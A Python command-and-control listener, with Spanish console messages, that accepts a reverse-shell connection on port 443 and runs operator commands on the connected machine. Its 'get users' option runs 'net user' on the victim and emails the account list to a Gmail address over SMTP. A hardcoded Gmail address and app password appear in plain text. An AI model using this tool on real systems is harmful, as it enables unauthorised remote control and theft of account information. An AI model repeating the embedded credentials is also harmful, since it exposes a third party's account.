#!/usr/bin/env python3

import socket
import signal
from termcolor import colored
import sys
import smtplib
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(colored("\n[+] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)



class Listener:

    def __init__(self, ip, port):
        self.options = {"get_users":"List system valid userers (Gmail)", "help":"Show this panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print("\n[+] Escuchando para conexiones entrantes...")

        self.client_socket, client_addr = server_socket.accept()

        print(f"\n[+] [ CONECTED <-> {client_addr} ]\n")


    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f"\n[+] Email sent successfully!\n")

    def get_users(self):
        net_user = "net user"
        self.client_socket.send(net_user.encode())
        output_cmd = self.client_socket.recv(2048).decode()

        self.send_email("Users List Info - C2", output_cmd, "lopu715@gmail.com", ["lopu715@gmail.com"], "ieuy uycq euap eamc")

    def show_help(self):
        for clave, valor in self.options.items():
            print(f"\n[+] {clave} - {valor}")

    def run(self):
        while True:
            command = input(">> ")
            if command == "get users":
                  self.get_users()
            elif command == "help":
                  self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)


if __name__ == "__main__":
    my_listener = Listener("192.168.1.187", 443)
    my_listener.run()
